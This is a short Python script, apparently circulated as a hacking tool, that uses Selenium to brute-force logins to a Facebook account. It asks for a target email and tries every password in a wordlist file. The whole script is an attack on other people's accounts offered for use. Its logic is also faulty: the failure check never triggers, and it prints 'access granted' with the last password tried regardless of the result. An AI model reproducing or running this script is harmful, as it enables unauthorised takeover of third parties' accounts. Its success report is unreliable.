import webbrowser
from selenium import webdriver
from selenium.webdriver.common.by import By
browser = webdriver.Firefox(executable_path="geckodriver.exe")
print(''' @CREATOR NETWORK SECURITY
      BRUTE FORCE VERSION 4.3.0   WORDLIST DEFAULT | EDIT PASS.TXT
      HOW TO USE AVILABEL IN YOUTUBE https://youtu.be/j8F4glPWWw4
      ''')
file = open("pass.txt")
passwd = file.read().splitlines()
email =input("[enter target]")
for x in passwd :
    print("reading ",x)
    browser.get("https://www.facebook.com/")
    browser.find_element(By.NAME, "email").send_keys(email)
    browser.find_element(By.NAME, "pass").send_keys(x)
    browser.find_element(By.NAME, "login").click()
    if browser.get("https://www.facebook.com/"):
     print("failed",x)
     browser.close()
else :
 print("access granted password is ",x)
